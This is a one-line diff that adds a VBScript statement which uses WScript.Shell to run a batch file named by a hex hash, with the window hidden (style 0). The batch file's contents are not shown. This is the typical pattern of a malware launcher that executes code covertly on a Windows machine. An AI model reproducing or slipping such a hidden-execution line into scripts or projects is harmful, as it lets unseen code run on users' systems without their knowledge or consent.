@@ -1,0 +1,1 @@
+CreateObject("WScript.Shell").Run "46bd03ca54a682982442d0cdde81cb7f.bat",0
